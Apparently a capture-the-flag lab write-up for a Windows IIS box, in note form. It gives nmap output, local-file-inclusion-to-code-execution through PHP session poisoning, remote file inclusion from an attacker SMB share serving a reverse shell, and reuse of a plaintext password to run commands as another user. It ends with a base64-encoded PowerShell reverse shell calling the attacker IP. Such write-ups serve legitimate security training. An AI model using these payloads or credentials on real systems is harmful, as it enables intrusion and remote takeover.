# NMAP TCP

TARGET: `10.129.229.6`
ME: `10.10.14.217`

```
└─$ sudo nmap -sC -sV -p- -Pn 10.129.229.6 -max-retries 1
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 15:48 -0400
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.80% done; ETC: 15:51 (0:02:18 remaining)
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 35.03% done; ETC: 15:51 (0:02:02 remaining)
Stats: 0:02:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 79.10% done; ETC: 15:50 (0:00:35 remaining)
Stats: 0:02:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 15:50 (0:00:04 remaining)
Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 15:51 (0:00:10 remaining)
Stats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 15:51 (0:00:11 remaining)
Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 15:51 (0:00:12 remaining)
Stats: 0:03:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 15:51 (0:00:14 remaining)
Nmap scan report for 10.129.229.6
Host is up (0.030s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-03-29T02:51:35
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.22 seconds
```

# Port 80

Found a website that is mostly dummy
Ran dirbuster - found a login page and registeration

Looks like a query parameter pulling in local PHP files so LFI

**Could be a vector for LFI to RCE in PHP using PHP Sessions**
https://www.rcesecurity.com/2017/08/upgrade-from-lfi-to-rce-via-php-sessions/

http://10.129.229.6/blog/?lang=blog-en.php

Need a file I can write to get full RCE from this

uses PHP SESSID cookies and a new user can be registered via http://10.129.229.6/user/registration.php which generates a new PHP Session

On Windows - PHP Sessions stored as files in \windows\temp\sess_x file paths

Registering as username like

```
a<?php echo `dir` ?>b
```

Gives a php session that lists directories by querying http://10.129.229.6/blog/?lang=\windows\temp\sess_nb987bsri0eoldbaqvjlte6afv

```
a<?php echo `dir \\inetpub\\wwwroot` ?>b
```

shows the website source dir

Then using 

```
a<?php echo `powershell cat \\inetpub\\wwwroot\\user\\registration*php` ?>c
```

Allows getting at the source code for registration.php

This page seems to filter username values anyway which is why the command needs to have a * instead of a . in it to serve as a wildcard for the commandline

Trying to leverage this to get a powershell b64 didn't really work too well

Seems we can also RFI by using `\\ipaddress\share\file.txt`

used impacket smbserver to serve up IvanSincek's reverseshell and got a rev shell connection

```
sudo impacket-smbserver test . -port 445 -smb2support
```

```
http://10.129.229.6/blog/?lang=\\10.10.14.217\test\rev.php
```

Got shell as:
```
C:\inetpub\wwwroot\blog>whoami
iis apppool\defaultapppool
```

# Shell as iis apppool

Found database creds in db.php that are apparently also user Chris credentials

Used these to get a runas

```
PS C:\inetpub\wwwroot\user> $user = "Sniper\Chris"
PS C:\inetpub\wwwroot\user> $pass = "36mEAhz/B8xQ~2VM"
PS C:\inetpub\wwwroot\user> $password = ConvertTo-SecureString $pass -AsPlainText -Force
PS C:\inetpub\wwwroot\user> $credential = New-Object System.Management.Automation.PSCredential $user, $password
-Object System.Management.Automation.PSCredential $user, $password
PS C:\inetpub\wwwroot\user> Invoke-Command -ScriptBlock {whoami} -Credential $credential
Invoke-Command : Parameter set cannot be resolved using the specified named parameters.
At line:1 char:1
+ Invoke-Command -ScriptBlock {whoami} -Credential $credential
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Invoke-Command], ParameterBindingException
    + FullyQualifiedErrorId : AmbiguousParameterSet,Microsoft.PowerShell.Commands.InvokeCommandCommand
 
PS C:\inetpub\wwwroot\user> Invoke-Command -ScriptBlock {whoami} -Credential $credential -Computer localhost
sniper\chris
```


Able to now use this to execute as Chris
```
Invoke-Command -ScriptBlock {COMMAND} -Credential $credential -Computer localhost
```

# Shell as Chris

At this point, found a C:/Docs folder due to Chris/Downloads having some instructions. However, it appears that I would need to use Nishang and perhaps a windows machine to solve for compiled html file:

https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e

Invoke-Command -ScriptBlock {powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAxADcAIgAsADkAMAAwADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA} -Credential $credential -Computer localhost